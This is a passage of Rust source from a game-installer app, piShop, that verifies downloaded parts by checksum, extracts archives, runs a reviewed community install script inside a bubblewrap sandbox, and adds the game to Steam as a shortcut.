                    if let Some(p) = r.parts.iter_mut().find(|p| p.id == ppart) {
                        p.verify = f;
                    }
                })
            })
        })
            .await
            .map_err(|e| anyhow!(e))
            .and_then(|r| r);
        BUSY.lock().unwrap().remove(&key);
        let user = matches!(s.source, PartSource::User { .. });
        match result {
            Ok(()) => change_part(&id, &part, |p| {
                p.state = PartState::Ready;
                p.verify = 1.0;
            }),
            Err(e) => {
                log!("comunidade: {id}/{part} não confere: {e:#}");
                // A user's file that isn't the right one: theirs to pick
                // again, or (for a part piShop can download) downloaded instead.
                change_part(&id, &part, |p| {
                    p.state = if user {
                        PartState::Waiting
                    } else if provided {
                        PartState::Downloading
                    } else {
                        PartState::Failed
                    };
                    p.error = Some(format!("{e:#}"));
                    if user || provided {
                        p.path = None;
                        p.provided = false;
                    }
                });
            }
        }
    });
}

/// Hashes a file once for every algorithm the manifest lists; Ok when each
/// of them matches one of its accepted values.
fn check(path: &Path, sums: &Checksums, progress: impl Fn(f32)) -> anyhow::Result<()> {
    if sums.is_empty() {
        return Ok(());
    }
    let len = std::fs::metadata(path)?.len().max(1);
    let mut f = std::fs::File::open(path)?;
    let mut s1 = (!sums.sha1.is_empty()).then(sha1::Sha1::new);
    let mut s256 = (!sums.sha256.is_empty()).then(sha2::Sha256::new);
    let mut m5 = (!sums.md5.is_empty()).then(md5::Md5::new);
    let mut buf = vec![0u8; 4 << 20];
    let (mut read, mut told) = (0u64, 0f32);
    loop {
        let n = f.read(&mut buf)?;
        if n == 0 {
            break;
        }
        let b = &buf[..n];
        if let Some(h) = s1.as_mut() {
            h.update(b);
        }
        if let Some(h) = s256.as_mut() {
            h.update(b);
        }
        if let Some(h) = m5.as_mut() {
            h.update(b);
        }
        read += n as u64;
        let f = read as f32 / len as f32;
        if f - told >= 0.01 {
            told = f;
            progress(f);
        }
    }
    let hex = |b: &[u8]| -> String { b.iter().map(|x| format!("{x:02x}")).collect() };
    let ok = |got: String, want: &[String]| want.iter().any(|w| w.trim().eq_ignore_ascii_case(&got));
    let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let wrong = || anyhow!(tr!("{name} isn't the expected file (its checksum doesn't match)", "{name} não é o arquivo esperado (o checksum não confere)"));
    if let Some(h) = s1
        && !ok(hex(&h.finalize()), &sums.sha1)
    {
        return Err(wrong());
    }
    if let Some(h) = s256
        && !ok(hex(&h.finalize()), &sums.sha256)
    {
        return Err(wrong());
    }
    if let Some(h) = m5
        && !ok(hex(&h.finalize()), &sums.md5)
    {
        return Err(wrong());
    }
    Ok(())
}

/// Extracting: each archive part into the game's folder, one job per part.
fn extracting(r: &Record) -> anyhow::Result<()> {
    let jobs = crate::archive::jobs();
    let mut progress = Vec::new();
    for p in &r.parts {
        let Some(sub) = spec(r, &p.id).and_then(|s| s.extract.clone()) else { continue };
        if p.extracted {
            progress.push(1.0);
            continue;
        }
        let key = (r.id.clone(), p.id.clone());
        let job = EXTRACTS.lock().unwrap().get(&key).and_then(|j| jobs.iter().find(|x| x.id == *j).cloned());
        let name = spec(r, &p.id).map(|s| s.name.clone()).unwrap_or_default();
        match job {
            Some(j) if j.state == crate::archive::State::Running => {
                progress.push(j.progress);
                touch(&r.id, |r| r.step = Some(tr!("Extracting {name}", "Extraindo {name}")));
            }
            Some(j) if j.state == crate::archive::State::Done => {
                EXTRACTS.lock().unwrap().remove(&key);
                change_part(&r.id, &p.id, |p| p.extracted = true);
                progress.push(1.0);
            }
            Some(j) => {
                EXTRACTS.lock().unwrap().remove(&key);
                let why = j.error.unwrap_or_else(|| tr!("extraction stopped", "extração interrompida"));
                fail(&r.id, Stage::Extracting, format!("{name}: {why}"));
                return Ok(());
            }
            // Not started (or piShop restarted meanwhile: extract again, overwriting).
            None => {
                let src = PathBuf::from(p.path.clone().unwrap_or_default());
                let dest = Path::new(&r.game_dir).join(&sub);
                match crate::archive::extract(&src, Some(dest), false) {
                    Ok(job) => {
                        EXTRACTS.lock().unwrap().insert(key, job);
                    }
                    Err((_, e)) => {
                        fail(&r.id, Stage::Extracting, format!("{name}: {e}"));
                        return Ok(());
                    }
                }
                progress.push(0.0);
            }
        }
    }
    let all = r.parts.iter().filter(|p| spec(r, &p.id).is_some_and(|s| s.extract.is_some())).count().max(1);
    let fraction = progress.iter().sum::<f32>() / all as f32;
    let done = record(&r.id).is_some_and(|r| r.parts.iter().all(|p| p.extracted || spec(&r, &p.id).is_none_or(|s| s.extract.is_none())));
    if done {
        change(&r.id, |r| {
            r.stage = Stage::Preparing;
            r.progress = None;
            r.step = None;
        });
    } else {
        touch(&r.id, |r| r.progress = Some(fraction));
    }
    Ok(())
}

// ---------- the script ----------

/// An environment variable name for a part: PISHOP_PART_<ID>.
fn part_var(id: &str) -> String {
    format!("PISHOP_PART_{}", id.to_uppercase().replace('-', "_"))
}

fn find_bwrap() -> Option<PathBuf> {
    ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"].iter().map(PathBuf::from).find(|p| p.is_file())
}

/// Folders that hold the user's own data, hidden from the script (real
/// folders only: on some systems /home is a link to /var/home).
const HIDDEN: &[&str] = &["/home", "/var/home", "/run", "/media", "/mnt", "/srv", "/tmp", "/var/tmp"];

/// bubblewrap's arguments: the system read-only, the user's data hidden, no
/// network; the game's folder writable, the parts read-only, a scratch
/// folder as /tmp, the script itself read-only.
fn sandbox_args(game_dir: &Path, parts: &[PathBuf], scratch: &Path, script: &Path) -> Vec<String> {
    let s = |p: &Path| p.display().to_string();
    let mut a: Vec<String> = ["--die-with-parent", "--new-session", "--unshare-all", "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc"]
        .iter()
        .map(|x| x.to_string())
        .collect();
    for h in HIDDEN {
        let real = std::fs::symlink_metadata(h).is_ok_and(|m| m.is_dir());
        if real {
            a.extend(["--tmpfs".into(), h.to_string()]);
        }
    }
    // /tmp first: the parts and the game's folder may live under it (binds
    // made before it would be covered).
    a.extend(["--bind".into(), s(scratch), "/tmp".into()]);
    a.extend(["--ro-bind".into(), s(script), "/tmp/.pishop/install.sh".into()]);
    for p in parts {
        a.extend(["--ro-bind".into(), s(p), s(p)]);
    }
    a.extend(["--bind".into(), s(game_dir), s(game_dir)]);
    a.extend(["--chdir".into(), s(game_dir)]);
    a.extend(["/bin/bash".into(), "--noprofile".into(), "--norc".into(), "-e".into(), "-o".into(), "pipefail".into(), "/tmp/.pishop/install.sh".into()]);
    a
}

/// Runs the game's script in the sandbox. Ok(true): it worked and left the
/// executable; Ok(false): stopped by the user.
async fn run_script(id: &str, mut stop: watch::Receiver<bool>) -> anyhow::Result<bool> {
    let r = record(id).ok_or_else(|| anyhow!("gone"))?;
    let m = &r.manifest;
    if sha256_hex(m.install.source.as_bytes()) != m.install.sha256.to_lowercase() {
        bail!(tr!("the script doesn't match the one reviewed", "o script não confere com o revisado"));
    }
    let bwrap = find_bwrap().ok_or_else(|| anyhow!(tr!("bubblewrap (bwrap) is needed to run community scripts safely", "o bubblewrap (bwrap) é necessário para rodar scripts da comunidade com segurança")))?;
    let work = dir().join(id);
    let scratch = work.join("tmp");
    let _ = std::fs::remove_dir_all(&scratch);
    std::fs::create_dir_all(&scratch)?;
    let script = work.join("install.sh");
    std::fs::write(&script, &m.install.source)?;
    let game_dir = PathBuf::from(&r.game_dir);
    std::fs::create_dir_all(&game_dir)?;
    let game_dir = game_dir.canonicalize()?;
    let parts: Vec<(String, PathBuf)> = r
        .parts
        .iter()
        .filter_map(|p| Some((p.id.clone(), PathBuf::from(p.path.as_ref()?).canonicalize().ok()?)))
        .collect();
    let mut cmd = tokio::process::Command::new(&bwrap);
    cmd.args(sandbox_args(&game_dir, &parts.iter().map(|(_, p)| p.clone()).collect::<Vec<_>>(), &scratch, &script))
        .env_clear()
        .env("PATH", "/usr/local/bin:/usr/bin:/bin")
        .env("HOME", "/tmp")
        .env("TMPDIR", "/tmp")
        .env("LANG", "C.UTF-8")
        .env("PISHOP_GAME_DIR", &game_dir)
        .env("PISHOP_GAME", &m.name)
        .env("PISHOP_EXE", &m.launch.exe)
        .env("PISHOP_LANG", if crate::settings::is_pt() { "pt" } else { "en" })
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    for (pid, path) in &parts {
        cmd.env(part_var(pid), path);
    }
    let mut child = cmd.spawn().context(tr!("couldn't start the script", "não foi possível iniciar o script"))?;
    LOGS.lock().unwrap().remove(id);
    let logfile = work.join("install.log");
    let _ = std::fs::write(&logfile, format!("# {} · {} · revision {}\n", m.name, chrono_now(), m.revision));
    log!("comunidade: {id} rodando o script (sandbox) em {}", game_dir.display());
    change(id, |r| {
        r.step = Some(tr!("Running the install script", "Rodando o script de instalação"));
        r.progress = None;
    });

    let (out, err) = (child.stdout.take(), child.stderr.take());
    let last_err = std::sync::Arc::new(Mutex::new(String::new()));
    let pump = |stream: Option<Box<dyn tokio::io::AsyncRead + Unpin + Send>>, is_err: bool| {
        let id = id.to_string();
        let logfile = logfile.clone();
        let last_err = last_err.clone();
        async move {
            let Some(s) = stream else { return };
            let mut lines = BufReader::new(s).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                handle_line(&id, &line);
                if is_err && !line.trim().is_empty() {
                    *last_err.lock().unwrap() = line.clone();
                }
                use std::io::Write;
                if let Ok(mut f) = std::fs::OpenOptions::new().append(true).open(&logfile) {
                    let _ = writeln!(f, "{}{line}", if is_err { "! " } else { "" });
                }
            }
        }
    };
    let out_task = tokio::spawn(pump(out.map(|s| Box::new(s) as Box<dyn tokio::io::AsyncRead + Unpin + Send>), false));
    let err_task = tokio::spawn(pump(err.map(|s| Box::new(s) as Box<dyn tokio::io::AsyncRead + Unpin + Send>), true));
    let status = tokio::select! {
        s = child.wait() => s?,
        _ = stop.changed() => {
            let _ = child.kill().await;
            log!("comunidade: {id} script interrompido");
            return Ok(false);
        }
    };
    let _ = tokio::join!(out_task, err_task);
    let _ = std::fs::remove_dir_all(&scratch);
    if !status.success() {
        let last = last_err.lock().unwrap().clone();
        let code = status.code().map(|c| c.to_string()).unwrap_or_else(|| "?".into());
        bail!(tr!("the install script stopped (code {code}): {last}", "o script de instalação parou (código {code}): {last}"));
    }
    let exe = game_dir.join(&m.launch.exe);
    if !exe.is_file() {
        bail!(tr!("the script finished but {} isn't there", "o script terminou mas {} não está lá", m.launch.exe));
    }
    log!("comunidade: {id} script concluído");
    Ok(true)
}

fn chrono_now() -> String {
    format!("unix {}", now())
}

/// Script output: `::step <text>` and `::progress <0-100> [text]` drive the
/// UI; every line goes to the log.
fn handle_line(id: &str, line: &str) {
    let line = line.trim_end();
    if let Some(text) = line.strip_prefix("::step ") {
        let text: String = text.trim().chars().take(120).collect();
        touch(id, |r| {
            r.step = Some(text.clone());
            r.progress = None;
        });
    } else if let Some(rest) = line.strip_prefix("::progress ") {
        let mut it = rest.trim().splitn(2, ' ');
        let pct = it.next().and_then(|n| n.trim_end_matches('%').parse::<f32>().ok());
        let text: Option<String> = it.next().map(|t| t.trim().chars().take(120).collect()).filter(|t: &String| !t.is_empty());
        touch(id, |r| {
            if let Some(p) = pct {
                r.progress = Some((p / 100.0).clamp(0.0, 1.0));
            }
            if text.is_some() {
                r.step = text.clone();
            }
        });
    }
    log_line(id, line);
}

// ---------- the shortcut ----------

async fn shortcut(id: &str) -> anyhow::Result<()> {
    let r = record(id).ok_or_else(|| anyhow!("gone"))?;
    if !steamclient::available().await {
        bail!(tr!(
            "turn on Steam's client API to add the game to Steam (Transfers → the game → Turn on)",
            "ative a API do cliente Steam para adicionar o jogo à Steam (Transferências → o jogo → Ativar)"
        ));
    }
    let key = library::community_key(id);
    let entry = library::get(&key).ok_or_else(|| anyhow!(tr!("this game has no data in piShop", "este jogo não tem dados no piShop")))?;
    let m = &r.manifest;
    let exe = PathBuf::from(&r.game_dir).join(&m.launch.exe);
    if !exe.is_file() {
        bail!(tr!("{} isn't in the game's folder", "{} não está na pasta do jogo", m.launch.exe));
    }
    let native = m.launch.runtime == "native";
    if native {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = std::fs::metadata(&exe) {
            let mut perm = meta.permissions();
            perm.set_mode(perm.mode() | 0o755);
            let _ = std::fs::set_permissions(&exe, perm);
        }
    }
    let tool = if native { String::new() } else { r.tool.clone() };
    // An earlier attempt's shortcut (or a reinstall's) is reused.
    let existing = entry.install.as_ref().and_then(|s| s.appid).or(r.appid);
    let still_there = match existing {
        Some(a) => steamclient::shortcut(a).await.ok().flatten().is_some(),
        None => false,
    };
    let appid = match existing.filter(|_| still_there) {
        Some(appid) => {
            steamclient::set_exe(appid, &install::quoted(&exe)).await?;
            steamclient::set_start_dir(appid, &install::quoted(exe.parent().unwrap_or(Path::new("/")))).await?;
            steamclient::set_launch_options(appid, &m.launch.options).await?;
            if !tool.is_empty() {
                steamclient::set_compat_tool(appid, &tool).await?;
            }
            appid
        }
        None => install::create_shortcut(&entry.game, &exe, &m.launch.options, &tool).await?,
    };
    library::set_install(
        &key,
        Some(InstallState {
            stage: InstallStage::Installed,
            appid: Some(appid),
            tool,
            target: r.game_dir.clone(),
            installer: None,
            exe: Some(exe.display().to_string()),
            started: now(),
            runner: String::new(),
            game_dir: Some(r.game_dir.clone()),
            restore: None,
            borrowed: None,
            external: false,
        }),
    );
    let _ = std::fs::create_dir_all(dir().join("manifests"));
    if let Ok(b) = serde_json::to_vec_pretty(&r.manifest) {
        let _ = std::fs::write(dir().join("manifests").join(format!("{id}.json")), b);
    }
    change(id, |r| {
        r.stage = Stage::Installed;
        r.appid = Some(appid);
        r.finished = Some(now());
        r.step = None;
        r.progress = None;
        r.error = None;
        r.failed_at = None;
    });
    log!("comunidade: {id} instalado → atalho {appid} ({})", exe.display());
    Ok(())
}

// ---------- actions ----------

#[derive(Deserialize)]
struct InstallReq {
    library: String,
    #[serde(default)]
    tool: String,
    /// Files the user already picked, by part id.
    #[serde(default)]
    files: BTreeMap<String, String>,
    /// Files picked on game sources (copied first), by part id.
    #[serde(default)]
    sources: BTreeMap<String, SourcePick>,
}

async fn begin_install(id: &str, req: InstallReq) -> anyhow::Result<Value> {
    let m = manifest(id).await?;
    if let Some(r) = record(id)
        && r.stage != Stage::Installed
    {
        bail!(tr!("this game is already being installed (see Transfers)", "este jogo já está sendo instalado (veja Transferências)"));
    }
    if !Path::new(&req.library).is_dir() {
        bail!(tr!("pick a Steam library", "escolha uma biblioteca Steam"));
    }
    if m.launch.runtime == "proton" && req.tool.trim().is_empty() {
        bail!(tr!("pick a Proton version", "escolha uma versão do Proton"));
    }
    let game_dir = install::target_for(&req.library, &m.name);
    let created_dir = !game_dir.exists();
    std::fs::create_dir_all(&game_dir).with_context(|| tr!("couldn't create {}", "não foi possível criar {}", game_dir.display()))?;
    let downloads = torrent::download_dir().join("Community").join(&m.id);
    std::fs::create_dir_all(&downloads)?;

    // The game's data: what the manifest says now, Steam/TheGamesDB/SteamGridDB in the background.
    let key = library::community_key(id);
    let total: u64 = m.parts.iter().filter_map(|p| p.size).sum();
    let hint = library::Hint {
        name: m.name.clone(),
        steam_appid: m.art.steam_appid.clone(),
        sgdb: Some(library::SgdbHint { name: m.name.clone(), cover: m.art.cover.clone(), hero: m.art.hero.clone(), year: None }),
        crack: None,
    };
    let platform = Some(m.platform.clone()).filter(|p| !p.is_empty());
    let mut game = library::quick(&hint, &m.name, platform.clone());
    game.overview = Some(m.summary.clone()).filter(|s| !s.is_empty());
    let previous = library::get(&key);
    if let Some(p) = &previous {
        game.sgdb_id = p.game.sgdb_id;
        game.sgdb_name = p.game.sgdb_name.clone();
        game.art_source = p.game.art_source.clone();
    }
    library::add(library::Entry {
        info_hash: key.clone(),
        game,
        release: match &m.wrapper {
            Some(w) => format!("{} · {}", m.name, w.name),
            None => m.name.clone(),
        },
        indexer: "community".into(),
        size: total,
        dest: Some(game_dir.display().to_string()),
        added: now(),
        resolved: false,
        install: previous.and_then(|p| p.install),
    });
    {
        let (hint, name, sgdb_id, summary, key) = (hint.clone(), m.name.clone(), m.art.sgdb_id, m.summary.clone(), key.clone());
        tokio::spawn(async move {
            let mut hint = hint;
            if hint.sgdb.as_ref().is_some_and(|s| s.cover.is_none())
                && let Some(art) = crate::catalog::art(&name).await
            {
                let hero = crate::catalog::hero(&art).await;
                hint.sgdb = Some(library::SgdbHint { name: art.name.clone(), cover: Some(art.cover.clone()), hero, year: art.year.map(|y| y as u32) });
            }
            let mut game = library::resolve(&hint, &name, platform, false).await;
            game.name = name;
            if game.overview.is_none() {
                game.overview = Some(summary).filter(|s| !s.is_empty());
            }
            if let Some(sid) = sgdb_id {
                game.sgdb_id = Some(sid);
                game.sgdb_name = Some(game.name.clone());
                if game.steam_appid.is_none() {
                    game.art_source = Some("sgdb".into());
                }
            }
            if !game.sources.iter().any(|s| s == "Community") {
                game.sources.insert(0, "Community".into());
            }
            library::update_game(&key, game);
        });
    }

    let parts: Vec<PartRec> = m
        .parts
        .iter()
        .map(|p| PartRec {
            id: p.id.clone(),
            state: if matches!(p.source, PartSource::User { .. }) { PartState::Waiting } else { PartState::Downloading },
            path: None,
            direct: None,
            torrent: None,
            provided: false,
            error: None,
            verify: 0.0,
            extracted: false,
            size: p.size,
            copy: None,
        })
        .collect();
    let rec = Record {
        id: id.to_string(),
        manifest: m.clone(),
        library: req.library.clone(),
        game_dir: game_dir.display().to_string(),
        downloads: downloads.display().to_string(),
        tool: req.tool.clone(),
        parts,
        stage: Stage::Downloading,
        failed_at: None,
        error: None,
        step: None,
        progress: None,
        paused: false,
        appid: None,
        created_dir,
        added: now(),
        finished: None,
    };
    {
        let mut map = RECORDS.lock().unwrap();
        map.insert(id.to_string(), rec);
        persist(&map);
    }
    LOGS.lock().unwrap().remove(id);
    log!("comunidade: instalando {id} → {} (downloads em {})", game_dir.display(), downloads.display());
    for (part, path) in req.files {
        if let Err(e) = provide(id, &part, &path) {
            change_part(id, &part, |p| p.error = Some(format!("{e:#}")));
        }
    }
    for (part, pick) in req.sources {
        if let Err(e) = provide_from_source(id, &part, &pick) {
            change_part(id, &part, |p| p.error = Some(format!("{e:#}")));
        }
    }
    Ok(view(&record(id).ok_or_else(|| anyhow!("gone"))?))
}

/// Whether a file smaller than a part may be taken as that part's partial
/// download (and moved, appended to, deleted if it turns out bad): only what
/// looks like one — a browser's or a torrent client's unfinished file, or one
/// named like the part — never any small file picked by mistake.
fn looks_partial(s: &Part, file: &Path) -> bool {
    let name = file.file_name().map(|n| n.to_string_lossy().to_lowercase()).unwrap_or_default();
    const SUFFIXES: &[&str] = &[".crdownload", ".part", ".partial", ".download", ".!qb", ".td", ".opdownload"];
    let declared = match &s.source {
        PartSource::Http { file, .. } | PartSource::Itch { file, .. } => file.to_lowercase(),
        _ => return false,
    };
    SUFFIXES.iter().any(|x| name.ends_with(x)) || (!declared.is_empty() && name.starts_with(&declared))
}

/// A file the user already has, for a part: their own copy of something not
/// public (used where it is), a finished download (used where it is), or a
/// partial one smaller than the part (moved next to the download and
/// continued from where it stopped).
fn provide(id: &str, part: &str, path: &str) -> anyhow::Result<()> {
    provide_file(id, part, path, false)
}

/// `ours`: a copy piShop made (from a game source), deleted with the downloads.
fn provide_file(id: &str, part: &str, path: &str, ours: bool) -> anyhow::Result<()> {
    let r = record(id).ok_or_else(|| anyhow!(tr!("no such install", "instalação não encontrada")))?;
    let s = spec(&r, part).ok_or_else(|| anyhow!(tr!("no such part", "parte não encontrada")))?.clone();
    let p = r.parts.iter().find(|p| p.id == part).cloned().ok_or_else(|| anyhow!(tr!("no such part", "parte não encontrada")))?;
    if matches!(p.state, PartState::Ready | PartState::Verifying) && !p.provided {
        bail!(tr!("this part is already here", "esta parte já está aqui"));
    }
    if !matches!(r.stage, Stage::Downloading | Stage::Failed) {
        bail!(tr!("the parts can't change now", "as partes não podem mudar agora"));
    }
    if BUSY.lock().unwrap().contains(&(id.to_string(), part.to_string())) {
        bail!(tr!("piShop is starting this part right now; try again in a moment", "o piShop está começando esta parte agora; tente de novo em um instante"));
    }
    let file = PathBuf::from(path);
    let meta = std::fs::metadata(&file).map_err(|_| anyhow!(tr!("file not found", "arquivo não encontrado")))?;
    if !meta.is_file() {
        bail!(tr!("pick a file", "escolha um arquivo"));
    }
    if let PartSource::User { extensions, .. } = &s.source {
        let low = file.to_string_lossy().to_lowercase();
        if !extensions.is_empty() && !extensions.iter().any(|x| low.ends_with(&x.to_lowercase())) {
            bail!(tr!("this part takes a {} file", "esta parte aceita um arquivo {}", extensions.join(" / ")));
        }
    }
    let size = p.size.or(s.size);
    let len = meta.len();
    let resumable = matches!(s.source, PartSource::Http { .. } | PartSource::Itch { .. } | PartSource::Github { .. });
    if let Some(want) = size {
        if len > want {
            bail!(tr!("this file is bigger than the part ({} bytes, {want} expected)", "este arquivo é maior que a parte ({} bytes, {want} esperados)", len));
        }
        if len < want && !(resumable && looks_partial(&s, &file)) {
            bail!(tr!("this file is smaller than the part ({} bytes, {want} expected)", "este arquivo é menor que a parte ({} bytes, {want} esperados)", len));
        }
        if len < want {
            // A partial download (a browser's .crdownload, an earlier .part):
            // it becomes this part's .part and the download continues from it.
            let (PartSource::Http { file: name, .. } | PartSource::Itch { file: name, .. }) = &s.source else {
                bail!(tr!("only a finished file works for this part", "só um arquivo completo serve para esta parte"));
            };
            let dest = PathBuf::from(&r.downloads).join(part).join(name);
            if let Some(did) = p.direct {
                direct::remove(did, false);
            }
            std::fs::create_dir_all(dest.parent().unwrap_or(Path::new("/")))?;
            let part_file = direct::part_path(&dest);
            change_part(id, part, |p| {
                p.direct = None;
                p.provided = false;
                p.path = None;
                p.error = None;
                p.state = PartState::Downloading;
            });
            // Same disk: it just moves. Another disk: it's copied (the user's
            // file stays), and the download waits for the copy.
            if std::fs::rename(&file, &part_file).is_err() {
                let key = (id.to_string(), part.to_string());
                BUSY.lock().unwrap().insert(key.clone());
                let (id, part) = (id.to_string(), part.to_string());
                tokio::spawn(async move {
                    let tmp = part_file.with_extension("part.copy");
                    let (from, to, tmp2) = (file.clone(), part_file.clone(), tmp.clone());
                    let copied = tokio::task::spawn_blocking(move || std::fs::copy(&from, &tmp2).and_then(|_| std::fs::rename(&tmp2, &to))).await;
                    BUSY.lock().unwrap().remove(&key);
                    match copied {
                        Ok(Ok(())) => log!("comunidade: {id}/{part} continua de uma cópia de {}", file.display()),
                        _ => {
                            let _ = std::fs::remove_file(&tmp);
                            change_part(&id, &part, |p| p.error = Some(tr!("couldn't copy the partial file; downloading from the start", "não foi possível copiar o arquivo parcial; baixando do começo")));
                        }
                    }
                });
            } else {
                log!("comunidade: {id}/{part} continua de {} ({len} bytes)", file.display());
            }
            change(id, |r| {
                if r.stage == Stage::Failed && r.failed_at == Some(Stage::Downloading) {
                    r.stage = Stage::Downloading;
                    r.error = None;
                    r.failed_at = None;
                }
            });
            return Ok(());
        }
    }
    // The whole file: whatever was downloading for this part stops.
    if let Some(did) = p.direct {
        direct::remove(did, true);
    }
    change_part(id, part, |p| p.direct = None);
    change(id, |r| {
        if r.stage == Stage::Failed && r.failed_at == Some(Stage::Downloading) {
            r.stage = Stage::Downloading;
            r.error = None;
            r.failed_at = None;
        }
    });
    log!("comunidade: {id}/{part} ← arquivo do usuário {}", file.display());
    verify_then_ready(id, part, file, !ours);
    Ok(())
}

/// A file on a game source (network storage) for a part: copied to the
/// device first (Transfers → Copies), then taken like a file picked here.
/// The part's own download waits meanwhile.
#[derive(Deserialize, Clone, Debug)]
pub struct SourcePick {
    pub source_id: String,
    /// Relative to the share's root.
    pub path: String,
    pub name: String,
    #[serde(default)]
    pub size: Option<u64>,
}

fn provide_from_source(id: &str, part: &str, pick: &SourcePick) -> anyhow::Result<()> {
    let r = record(id).ok_or_else(|| anyhow!(tr!("no such install", "instalação não encontrada")))?;
    let s = spec(&r, part).ok_or_else(|| anyhow!(tr!("no such part", "parte não encontrada")))?.clone();
    let p = r.parts.iter().find(|p| p.id == part).cloned().ok_or_else(|| anyhow!(tr!("no such part", "parte não encontrada")))?;
    if !matches!(r.stage, Stage::Downloading | Stage::Failed) || matches!(p.state, PartState::Ready | PartState::Verifying | PartState::Copying) && !p.provided {
        bail!(tr!("the parts can't change now", "as partes não podem mudar agora"));
    }
    let name = direct::safe_name(&pick.name);
    if name.is_empty() {
        bail!(tr!("pick a file", "escolha um arquivo"));
    }
    if let PartSource::User { extensions, .. } = &s.source {
        let low = name.to_lowercase();
        if !extensions.is_empty() && !extensions.iter().any(|x| low.ends_with(&x.to_lowercase())) {
            bail!(tr!("this part takes a {} file", "esta parte aceita um arquivo {}", extensions.join(" / ")));
        }
    }
    let resumable = matches!(s.source, PartSource::Http { .. } | PartSource::Itch { .. } | PartSource::Github { .. });
    if let (Some(want), Some(have)) = (p.size.or(s.size), pick.size) {
        if have > want {
            bail!(tr!("this file is bigger than the part", "este arquivo é maior que a parte"));
        }
        if have < want && !(resumable && looks_partial(&s, Path::new(&name))) {
            bail!(tr!("this file is smaller than the part", "este arquivo é menor que a parte"));
        }
    }
    let dest = PathBuf::from(&r.downloads).join(part).join("copy");
    std::fs::create_dir_all(&dest)?;
    let job = crate::jobs::enqueue(&pick.source_id, &dest.display().to_string(), vec![crate::jobs::NewItem { path: pick.path.clone(), name: name.clone(), dir: false }])?
        .into_iter()
        .next()
        .ok_or_else(|| anyhow!(tr!("couldn't start the copy", "não foi possível começar a cópia")))?;
    if let Some(did) = p.direct {
        direct::pause(did);
    }
    change_part(id, part, |p| {
        p.state = PartState::Copying;
        p.copy = Some(job);
        p.error = None;
    });
    change(id, |r| {
        if r.stage == Stage::Failed && r.failed_at == Some(Stage::Downloading) {
            r.stage = Stage::Downloading;
            r.error = None;
            r.failed_at = None;
        }
    });
    log!("comunidade: {id}/{part} copiando {} de {} → {}", pick.path, pick.source_id, dest.display());
    Ok(())
}

/// A part's copy from a game source: once it's on the device it's taken
/// like a file picked here; if it failed, the part goes back to what it was.
fn copied(r: &Record, p: &PartRec) {
    let user = spec(r, &p.id).is_some_and(|s| matches!(s.source, PartSource::User { .. }));
    let job = p.copy.and_then(|j| crate::jobs::list().into_iter().find(|x| x.id == j));
    let back = |error: Option<String>| {
        change_part(&r.id, &p.id, |x| {
            x.state = if user { PartState::Waiting } else { PartState::Downloading };
            x.copy = None;
            x.error = error;
        });
        if let Some(did) = p.direct {
            direct::resume(did);
        }
    };
    match job {
        Some(j) if j.status == crate::jobs::Status::Done => {
            let file = Path::new(&j.dest_dir).join(&j.name);
            change_part(&r.id, &p.id, |x| {
                x.state = if user { PartState::Waiting } else { PartState::Downloading };
                x.copy = None;
            });
            if let Err(e) = provide_file(&r.id, &p.id, &file.display().to_string(), true) {
                back(Some(format!("{e:#}")));
            }
        }
        Some(j) if matches!(j.status, crate::jobs::Status::Failed | crate::jobs::Status::Canceled) => {
            back(Some(j.error.unwrap_or_else(|| tr!("the copy stopped", "a cópia parou"))));
        }
        Some(_) => {}
        None => back(Some(tr!("the copy isn't in Transfers anymore", "a cópia não está mais em Transferências"))),
    }
}

async fn set_paused(id: &str, paused: bool) -> anyhow::Result<()> {
    let r = record(id).ok_or_else(|| anyhow!(tr!("no such install", "instalação não encontrada")))?;
    for p in r.parts.iter().filter(|p| p.state == PartState::Downloading) {
        if let Some(d) = p.direct {
            if paused { direct::pause(d) } else { direct::resume(d) }
        }
        if let Some(h) = &p.torrent {
            let _ = torrent::act(h, if paused { "pause" } else { "start" }).await;
        }
    }
    change(id, |r| r.paused = paused);
    Ok(())
}

/// Tries the step that failed again.
async fn retry(id: &str) -> anyhow::Result<()> {
    let r = record(id).ok_or_else(|| anyhow!(tr!("no such install", "instalação não encontrada")))?;
    if r.stage != Stage::Failed {
        return Ok(());
    }
    let at = r.failed_at.unwrap_or(Stage::Downloading);
    if at == Stage::Downloading {
        for p in r.parts.iter().filter(|p| p.state == PartState::Failed) {
            match p.direct.and_then(direct::get) {
                // A checksum that didn't match: the file is bad, download it again.
                Some(d) if d.state == direct::State::Done => {
                    direct::remove(d.id, true);
                    change_part(id, &p.id, |p| p.direct = None);
                }
                Some(d) => direct::resume(d.id),
                None => {}
            }
            if let Some(h) = &p.torrent {
                let _ = torrent::act(h, "start").await;
            }
            change_part(id, &p.id, |p| {
                p.state = PartState::Downloading;
                p.error = None;
            });
        }
    }
    change(id, |r| {
        r.stage = at;
        r.error = None;
        r.failed_at = None;
        r.paused = false;
    });
    Ok(())
}

/// Stops everything; `delete` also erases the downloaded parts (never a file
/// the user brought). An install that didn't finish takes its folder and
/// data with it; a finished one stays in Games.
async fn remove(id: &str, delete: bool) -> anyhow::Result<Value> {
    let r = record(id).ok_or_else(|| anyhow!(tr!("no such install", "instalação não encontrada")))?;
    if let Some(tx) = SCRIPTS.lock().unwrap().remove(id) {
        let _ = tx.send(true);
    }
    let jobs: Vec<u64> = EXTRACTS.lock().unwrap().iter().filter(|((g, _), _)| g == id).map(|(_, j)| *j).collect();
    for j in jobs {
        let _ = crate::archive::cancel(j);
    }
    EXTRACTS.lock().unwrap().retain(|(g, _), _| g != id);
    let mut freed = 0u64;
    for p in &r.parts {
        if let Some(j) = p.copy {
            crate::jobs::cancel(j);
        }
        if let Some(d) = p.direct {
            if delete {
                freed += direct::get(d).map(|d| d.done).unwrap_or(0);
            }
            direct::remove(d, delete);
        }
        if let Some(h) = &p.torrent {
            if let Err(e) = torrent::act(h, if delete { "delete" } else { "forget" }).await {
                log!("comunidade: torrent {h}: {e:#}");
            }
        }
    }
    if delete {
        // Everything downloaded or copied for it (counted before it goes).
        let dir = PathBuf::from(&r.downloads);
        freed = freed.max(tokio::task::spawn_blocking(move || crate::relocate::dir_size(&dir)).await.unwrap_or(0));
        let _ = std::fs::remove_dir_all(&r.downloads);
    }
